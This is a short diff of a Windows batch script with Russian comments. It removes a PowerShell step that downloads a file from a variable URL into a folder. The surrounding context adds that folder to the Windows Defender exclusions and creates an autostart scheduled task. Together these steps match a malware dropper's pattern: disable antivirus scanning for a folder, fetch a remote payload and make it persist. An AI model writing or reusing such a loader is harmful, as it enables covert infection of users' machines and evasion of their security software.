@@ -15,15 +15,6 @@ powershell -NoProfile -Command "try { Add-MpPreference -ExclusionPath '%outputFo
 
 timeout /t 1 >nul
 
-:: Скачиваем файл
-echo [*] Downloading file to %outputFilePath% ...
-powershell -NoProfile -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%'; Write-Host 'File downloaded.' -ForegroundColor Green } catch { Write-Host 'Failed to download file.' -ForegroundColor Red; exit 1 }"
-
-:: Проверка наличия файла
-if not exist "%outputFilePath%" (
-    echo [!] File was not downloaded. Exiting.
-    exit /b 1
-)
 
 :: Добавляем задачу в автозагрузку
 echo [*] Creating scheduled task...
